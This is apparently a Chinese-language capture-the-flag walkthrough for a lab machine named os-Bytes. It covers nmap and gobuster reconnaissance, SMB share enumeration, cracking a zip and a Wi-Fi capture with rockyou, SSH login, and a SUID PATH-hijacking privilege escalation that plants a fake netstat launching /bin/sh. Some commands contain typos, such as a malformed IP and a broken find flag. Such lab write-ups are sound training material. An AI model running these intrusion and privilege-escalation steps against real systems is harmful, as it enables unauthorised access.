# os-Bytes

## 信息收集

`netdiscovery -i eth0`

`nmap -sV -sC 192.168.43.74 -oA os-Bytes`

`gobuster  -u 192.168.43.74 -w /usr/share/wordlists/dirbuster/ -t 100`

## 攻击开始

![image-20201227202751388](https://i.loli.net/2020/12/27/pSZyO13kemdjqbv.png)

有smb端口开放，使用nmap脚本泡一下

`nmap -p 139,445 --script=smb-vuln-*.nse --script-args=unsafe=1 192.168.43.74`

![image-20201227202845114](https://i.loli.net/2020/12/27/WGlYbioST6x9RMd.png)

大骂一句辣鸡什么东西。

![image-20201227202905979](https://i.loli.net/2020/12/27/r8cuHSd5RXUVYb6.png)

`smbmap -H 192.168.43.74`列出他的共享目录，发现没有权限。

![image-20201227202957948](https://i.loli.net/2020/12/27/V3dtGpKDQilfcnZ.png)

发现admin用户密码不对的时候自动使用guest访问。

![image-20201227203050631](https://i.loli.net/2020/12/27/CfzWwNGLhXkVcMK.png)

一个专业的评估软件。可以跑出来有哪些用户。

然后使用`smbmap -H 1192.168.43.74 -u sm`b来测试出这个账户没有密码

![image-20201227203923930](https://i.loli.net/2020/12/27/pTsNyOBhefgmYu7.png)

![image-20201227204110324](https://i.loli.net/2020/12/27/qTvjAetdWMbHOi9.png)

发现登陆不上去，但是smb用户是没有密码的，但是为什么也是一样的呢？

说明smb的共享目录被隐藏了，现在来尝试下一种方法。（读取隐藏目录）

![image-20201227204242998](https://i.loli.net/2020/12/27/jTpRZaWLfD96CIs.png)

猜测目录的位置

`/home/smb`或者`/home/smb/smb`目录的操作。

![image-20201227204420368](https://i.loli.net/2020/12/27/rRgh3Mcp6LajQd4.png)

![image-20201227204509954](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20201227204509954.png)

这样就登陆成功并且拿到了文件。

然后爆破压缩包

`fcrackzip -D -p  /usr/share/wordlists/rockyou.txt  -u safe.zip`

`aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap` 爆破加密流量包。

然后得到账号和密码，ssh登陆。

然后查找有无suid文件。`find / type f -perm -u=s 2>/dev/null`

`xxd /usr/bin/netscan| less`分析文件。

![image-20201227211519718](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20201227211519718.png)

来做环境变量的劫持。

![image-20201227211651547](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20201227211651547.png)

```
因为这个root程序运行的时候，会调用netstat命令
echo "/bin/sh" >netstat
chmod 755 netstat
echo $PATH
export PATH=/tmp:$PATH
echo $PATH
然后就可以了。suid劫持提权。
```

```
sudo -l 查看当前权限，以及权限说明
```

